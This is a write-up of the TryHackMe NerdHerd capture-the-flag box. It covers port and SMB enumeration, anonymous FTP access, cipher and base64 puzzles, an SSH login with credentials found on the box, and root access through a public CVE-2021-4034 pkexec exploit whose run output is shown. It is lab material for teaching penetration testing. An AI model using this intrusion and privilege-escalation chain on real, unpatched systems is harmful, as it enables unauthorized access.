---
title: "NerdHerd"
date: 2025-03-29
image: /assets/img/tryhackme/NerdHerd/NerdHerd_image.jpg
description: Writeup of the TryHackMe-CTF NerdHerd
categories: [TryHackMe, Medium]
tags: [linux]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>NerdHerd</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Hack your way into this easy/medium level legendary TV series "Chuck" themed box!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/nerdherd">https://tryhackme.com/room/nerdherd</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge NerdHerd.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/nerdherd$ nmap -p- 10.10.243.230
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 13:30 EDT
  Nmap scan report for 10.10.243.230
  Host is up (0.043s latency).
  Not shown: 65530 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  1337/tcp open  waste

  Nmap done: 1 IP address (1 host up) scanned in 44.68 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/nerdherd$ nmap -A -p 21,22,139,445,1337 10.10.243.230
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 13:32 EDT
  Nmap scan report for 10.10.243.230
  Host is up (0.040s latency).

  PORT     STATE SERVICE     VERSION
  21/tcp   open  ftp         vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:[attacker-ip]
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
  |   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
  |_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  |   Computer name: nerdherd
  |   NetBIOS computer name: NERDHERD\x00
  |   Domain name: \x00
  |   FQDN: nerdherd
  |_  System time: 2025-03-29T19:32:35+02:00
  |_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
  | smb2-time: 
  |   date: 2025-03-29T17:32:35
  |_  start_date: N/A
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```
From here I proceeded the analysis port by port.

## Port 21 Analysis

Since the Nmap scan revealed that the FTP server had anonymous access available, I began by enumerating the SMB share:
```bash
kali@kali:~/ctf/nerdherd$ ftp anonymous@10.10.243.230
  Connected to 10.10.243.230.
  220 (vsFTPd 3.0.3)
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
ftp> ls -al
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
226 Directory send OK.
ftp> cd .jokesonyou
ftp> ls -al
229 Entering Extended Passive Mode (|||49336|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
```

The FTP server contained a text file and an image, both of which I analyzed further:
```bash
kali@kali:~/ctf/nerdherd$ cat hellon3rd.txt 
all you need is in the leet

kali@kali:~/ctf/nerdherd$ exiftool youfoundme.png

Owner Name : fijbxslz
```

The only interesting part was the owner information in the image's metadata. I pasted the string into the <a href="https://www.boxentriq.com/code-breaking/cipher-identifier">BOXENTRIQ Cipher Identifier and Analyzer</a>, which identified it as a Vigenère Cipher, but I didn't have a key yet:

![Cypher](/assets/img/tryhackme/NerdHerd/thm_nerdherd_1.jpg)


## Port 139 & 445 Analysis

Because these ports likely indicated an SMB share, I initiated an `enum4linux` scan, which produced the following output:
```bash
=======================================( Users on 10.10.243.230 )=======================================
                                                                                                                        
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:                                   

user:[chuck] rid:[0x3e8]
=================================( Share Enumeration on 10.10.243.230 )=================================
                                                                                                                        
                                                                                                                        
        Sharename             Type      Comment
        ---------             ----      -------
        print$                Disk      Printer Drivers
        nerdherd_classified   Disk      Samba on Ubuntu
        IPC$                  IPC       IPC Service (nerdherd server (Samba, Ubuntu))
[...]
//10.10.243.230/nerdherd_classified     Mapping: DENIED Listing: N/A Writing: N/A
```

I found an SMB share called `nerdherd_classified`, but I wasn't able to list the files inside the directory without a password. I noted this information and moved on.

## Port 1337 Analysis

Port 1337 was serving a web server that displayed the Apache2 default page. I initiated a Gobuster directory enumeration and manually inspected the source code. The source code continued several comments and a clue:
```bash
<!--
	hmm, wonder what i hide here?
 -->

<!--
	maybe nothing? :)
 -->

<!--
	keep digging, mister/ma'am
 -->

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>
```

I analyzed the YouTube URL, which referenced the song `The Trashmen - Surfin Bird - Bird is the Word 1963`. In the song, the word `bird` was repeated frequently, leading me to suspect that the video or the lyric might be part of the puzzle. I started CyberChef with the Vigenère decoding module:

![CyberChef Decoding 1](/assets/img/tryhackme/NerdHerd/thm_nerdherd_2.jpg)

This result seemed incomplete, so I experimented with various combinations using the song's lyrics and eventually found the key:

![CyberChef Decoding 2](/assets/img/tryhackme/NerdHerd/thm_nerdherd_3.jpg)

### SMB share analysis

While analyzing the SMB share, I found the username `chuck` and a directory that I hadnt' have permissions to access. Using the previously discovered password, I attempted to access it again:
```bash
kali@kali:~/ctf/nerdherd$ smbclient \\\\10.10.243.230\\nerdherd_classified -U chuck 
  Password for [WORKGROUP\chuck]:
  Try "help" to get a list of possible commands.
  smb: \> ls
  smb: \> ls
    .                                   D        0  Thu Sep 10 21:29:53 2020
    ..                                  D        0  Thu Nov  5 15:44:40 2020
    secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020
kali@kali:~/ctf/nerdherd$ cat secr3t.txt   
  Ssssh! don't tell this anyone because you deserved it this far:

          check out "/t[removed]y"

  Sincerely,
          0xpr0N3rd
  <3
```

The SMB share contained a file called `secr3t.txt`, which revealed a hidden directory.

### Directory Analysis

In addition to the hidden directory, I reviewed the completed Gobuster directory enumeration:
```bash
kali@kali:~/ctf/nerdherd$ gobuster dir --url http://10.10.243.230:1337 --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.243.230:1337
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 280]
  /.hta.txt             (Status: 403) [Size: 280]
  /.hta                 (Status: 403) [Size: 280]
  /.htaccess.html       (Status: 403) [Size: 280]
  /.htaccess            (Status: 403) [Size: 280]
  /.hta.php             (Status: 403) [Size: 280]
  /.hta.html            (Status: 403) [Size: 280]
  /.htaccess.php        (Status: 403) [Size: 280]
  /.htpasswd.html       (Status: 403) [Size: 280]
  /.htpasswd            (Status: 403) [Size: 280]
  /.htpasswd.txt        (Status: 403) [Size: 280]
  /.htpasswd.php        (Status: 403) [Size: 280]
  /.htaccess.txt        (Status: 403) [Size: 280]
  /admin                (Status: 301) [Size: 321] [--> http://10.10.243.230:1337/admin/]
  /index.html           (Status: 200) [Size: 11755]
  /index.html           (Status: 200) [Size: 11755]
  /server-status        (Status: 403) [Size: 280]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

I explored the `admin`directory, which displayed a log in mechanism that didn't seem functional:

![Login](/assets/img/tryhackme/NerdHerd/thm_nerdherd_4.jpg)

While searching for the login logic, I only found an encoded string, which, after decoding, appeared incomplete:
```bash
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->

kali@kali:~/ctf/nerdherd$ echo "Y2liYXJ0b3dza2k=" | base64 -d                                    
  cibartowski 

kali@kali:~/ctf/nerdherd$ echo "aGVoZWdvdTwdasddHlvdQ==" | base64 -d
  hehegou<j�][�base64: invalid input
```

## Initial access as chuck

The last directory I hadn't explored was the hidden one mentioned in the SMB share hint:

![Hidden Directory](/assets/img/tryhackme/NerdHerd/thm_nerdherd_5.jpg)

Inside, I found a `creds.txt` file containing credentials for the SSH access. I used these credentials to connect as `chuck` via SSH and retrieved the user flag:
```bash
kali@kali:~/ctf/nerdherd$ cat creds.txt
  alright, enough with the games.

  here, take my ssh creds:
    
    chuck : t[removed]s

kali@kali:~/ctf/nerdherd$ ssh chuck@10.10.243.230

chuck@nerdherd:~$ id
  uid=1000(chuck) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
chuck@nerdherd:~$ cat user.txt 
  THM{7[removed]e}
```

## Privilege Escalation root
Next, I checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
chuck@nerdherd:~$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7fd516b109b0 at 0x7fd51698d6a0>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

I expected the root flag to be in the usual location, but it wasn’t there.
```bash
root@nerdherd:/root# cat /root.txt
  cmon, wouldnt it be too easy if i place the root flag here?
```

After further enumeration, I found the actual root flag in the /opt directory.
```bash
root@nerdherd:/opt# ls -al
  total 12
  drwxr-xr-x  2 root root 4096 Sep 14  2020 .
  drwxr-xr-x 24 root root 4096 Sep 11  2020 ..
  -r--------  1 root root   96 Sep 14  2020 .root.txt
root@nerdherd:/opt# cat .root.txt
  nOOt nOOt! you've found the real flag, congratz!

  THM{5[removed]3}
```

I continued to enumerate the system for the bonus flag and found it in root's `.bash_history` file:
```bash
root@nerdherd:/root# cat .bash_history | grep -i --text "THM{"
  THM{a[removed]7}
```

solved! :)